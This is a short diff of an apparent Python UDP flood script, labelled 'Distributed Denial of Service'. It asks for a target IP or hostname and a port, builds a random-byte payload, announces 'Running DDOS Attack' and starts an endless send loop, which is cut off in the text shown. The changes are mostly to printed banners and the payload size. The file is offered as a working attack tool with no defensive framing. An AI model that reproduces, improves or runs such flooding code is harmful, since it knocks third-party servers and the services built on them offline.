@@ -14,24 +14,23 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(20)
 #############
 
 os.system("clear")
 
 print("\033[41m\033[1;37m  Distributed Denial of Service \033[0m\n")
-print("\033[1;32mPress CTRL+C to stop sending")
-print(" ")
-print("\033[1;37m------------ \033[0m")
+print("\033[1;32mPress CTRL+C to stop sending\033[0m \n")
+print("-------------------------")
 print("\033[1;37mINPUT TARGET IP Adress \033[0m")
-print("\033[1;37m------------ \033[0m\n")
+print("-------------------------")
 
 # get host and ip
 ip = raw_input("\033[37m[*] \033[91mIP or HOSTNAME :\033[32m ")
 port = input("\033[37m[*] \033[91mPORT SCANNING  :\033[32m ")
 
 os.system("clear")
-print(" Run DDOS Attack.")
+print("Running DDOS Attack")
 
 sent = 0
 while True:
